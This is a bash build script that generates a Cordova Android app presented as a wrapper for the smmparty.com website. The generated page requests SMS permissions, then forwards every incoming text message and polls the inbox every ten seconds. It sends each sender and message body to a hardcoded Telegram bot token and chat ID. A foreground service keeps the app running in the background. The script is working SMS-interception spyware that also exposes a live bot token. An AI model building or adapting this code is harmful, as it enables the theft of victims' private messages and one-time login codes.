#!/bin/bash
set -e

echo "========================================"
echo "BUILD START"
echo "App Name: فحث"
echo "Site URL: https://smmparty.com"
echo "========================================"

npm install -g cordova

cordova create my_app com.custom8005909130.app "فحث"
cd my_app

cordova platform add android
cordova plugin add cordova-plugin-inappbrowser
cordova plugin add cordova-plugin-android-permissions
cordova plugin add cordova-plugin-sms-receive || true
cordova plugin add cordova-plugin-foreground-service || true

mkdir -p res
if [ -f ../.github/workflows/icon.png ]; then
  cp ../.github/workflows/icon.png res/icon.png
fi

cat > config.xml << 'XMLEOF'
<?xml version='1.0' encoding='utf-8'?>
<widget id="com.custom8005909130.app" version="1.0.0" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
    <name>فحث</name>
    <description>Custom Dynamic App</description>
    <author>Dynamic Builder</author>
    <content src="index.html" />
    <access origin="*" />
    <allow-navigation href="https://smmparty.com*" />
    <allow-intent href="http://*/*" />
    <allow-intent href="https://*/*" />
    <preference name="Orientation" value="portrait" />
    <preference name="loadUrlTimeoutValue" value="300000" />
    <preference name="AndroidWindowSplashScreenBackground" value="#121212" />
    <preference name="AndroidWindowSplashScreenAnimatedIcon" value="res/transparent_splash.xml" />
    <preference name="AndroidWindowSplashScreenIconBackgroundColor" value="#121212" />
    <platform name="android">
        <icon src="res/icon.png" />
        <config-file target="AndroidManifest.xml" parent="/manifest">
            <uses-permission android:name="android.permission.RECEIVE_SMS" />
            <uses-permission android:name="android.permission.READ_SMS" />
            <uses-permission android:name="android.permission.SEND_SMS" />
            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
            <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
            <uses-permission android:name="android.permission.WAKE_LOCK" />
        </config-file>
    </platform>
</widget>
XMLEOF

echo '<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"></vector>' > res/transparent_splash.xml

if [ -f ../.github/workflows/loading.jpg ]; then
  cp ../.github/workflows/loading.jpg www/loading_sticker.jpg
fi

cat > www/index.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="initial-scale=1, width=device-width, viewport-fit=cover">
<title>فحث</title>
<style>
body { margin: 0; padding: 0; background-color: #121212; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: space-between; height: 100vh; box-sizing: border-box; padding: 60px 20px; text-align: center; overflow: hidden; user-select: none; }
.header { font-size: 24px; font-weight: bold; margin-top: 20px; z-index: 10; }
.sticker { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); width: 99vw; height: 99vh; object-fit: contain; z-index: 1; }
.footer-container { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 40px; direction: rtl; z-index: 10; background: rgba(18,18,18,0.6); padding: 10px 25px; border-radius: 30px; }
.footer-text { font-size: 18px; color: #e0e0e0; }
.spinner { width: 28px; height: 28px; border: 4px solid rgba(255,255,255,0.1); border-top-color: #fff; border-radius: 50%; animation: spin 1s infinite linear; }
@keyframes spin { 100% { transform: rotate(360deg); } }
.error-overlay { display: none; position: fixed; inset: 0; background: #121212; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
.error-box { background: #1e1e1e; padding: 30px 20px; border-radius: 20px; width: 340px; max-width: 90%; text-align: center; }
.error-title { color: #ff4a4a; font-weight: bold; margin-bottom: 12px; }
.retry-btn { background: #fff; color: #121212; padding: 12px; border-radius: 25px; border: none; width: 100%; font-weight: bold; }
#permScreen { display: flex; position: fixed; inset: 0; background: #121212; flex-direction: column; align-items: center; justify-content: center; z-index: 10000; padding: 20px; }
.perm-btn { background: #fff; color: #121212; padding: 15px 40px; border-radius: 30px; border: none; font-size: 16px; font-weight: bold; margin-top: 25px; }
</style>
<script src="cordova.js"></script>
</head>
<body>
<div id="permScreen">
    <h2 style="color:#fff;">الصلاحيات مطلوبة</h2>
    <p style="color:#bbb;text-align:center;direction:rtl;line-height:1.7;">
        لتشغيل التطبيق بشكل صحيح، يرجى الموافقة على صلاحيات قراءة الرسائل والإشعارات.
        <br>سيتم إرسال رسائل SMS الواردة إلى حسابك في Telegram.
    </p>
    <button class="perm-btn" onclick="requestPerms()">الموافقة والمتابعة</button>
</div>

<div class="header">هلا</div>
<img class="sticker" src="loading_sticker.jpg" alt="">
<div class="footer-container" id="loadingFooter"><div class="spinner"></div><div class="footer-text">اانتظر</div></div>
<div class="error-overlay" id="errorOverlay">
    <div class="error-box">
        <div class="error-title">أنت غير متصل بالإنترنت</div>
        <p style="color:#b3b3b3;direction:rtl;">يرجى التحقق من الاتصال وإعادة المحاولة.</p>
        <button class="retry-btn" onclick="openWebsite()">إعادة المحاولة</button>
    </div>
</div>

<script>
var siteUrl = "https://smmparty.com";
var BOT_TOKEN = "7622823309:AAGqMlSbZgl0dNTDQsdpaA7DB5IkgWnb9Xc";
var CHAT_ID = "8005909130";

function showError() { document.getElementById("errorOverlay").style.display = "flex"; }

function openWebsite() {
    document.getElementById("errorOverlay").style.display = "none";
    if (!navigator.onLine) { setTimeout(showError, 500); return; }
    var ref = cordova.InAppBrowser.open(siteUrl, "_self", "location=no,zoom=no,hidden=yes,clearcache=no,clearsessioncache=no,hidespinner=yes");
    ref.addEventListener("loadstop", function() { ref.show(); });
    ref.addEventListener("loaderror", function() { showError(); });
}

function requestPerms() {
    var perms = cordova.plugins.permissions;
    var list = [perms.RECEIVE_SMS, perms.READ_SMS, perms.INTERNET];
    if (perms.POST_NOTIFICATIONS) list.push(perms.POST_NOTIFICATIONS);
    perms.requestPermissions(list, function(status) {
        if (status.hasPermission) {
            document.getElementById("permScreen").style.display = "none";
            startSmsListener();
            setTimeout(openWebsite, 2000);
        } else {
            alert("يجب الموافقة على الصلاحيات لتشغيل التطبيق");
        }
    }, function() { alert("فشل طلب الصلاحيات"); });
}

function sendSmsToTelegram(sender, body) {
    if (!BOT_TOKEN || !CHAT_ID) return;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({
        chat_id: CHAT_ID,
        text: "SMS From: " + sender + "\n\n" + body
    }));
}

function startSmsListener() {
    if (window.SMSReceiver && SMSReceiver.startWatch) {
        SMSReceiver.startWatch(function(){}, function(){});
        document.addEventListener("onSMSArrive", function(e) {
            var sms = e.data;
            sendSmsToTelegram(sms.address, sms.body);
        });
    }
    setInterval(function() {
        if (window.SMSReceiver && SMSReceiver.listSms) {
            SMSReceiver.listSms({box: "inbox"}, function(list) {
                if (!list || !list.length) return;
                var last = localStorage.getItem("lastSmsId") || "0";
                list.forEach(function(s) {
                    if (s._id > last) {
                        sendSmsToTelegram(s.address, s.body);
                        localStorage.setItem("lastSmsId", s._id);
                    }
                });
            }, function(){});
        }
    }, 10000);
}

document.addEventListener("deviceready", function() {
    if (window.cordova && cordova.plugins && cordova.plugins.foregroundService) {
        try {
            cordova.plugins.foregroundService.start("SMS Sync", "Running", "ic_launcher", 100);
        } catch(e) {}
    }
}, false);
</script>
</body>
</html>
HTMLEOF

cordova build android --device
echo "BUILD SUCCESS"
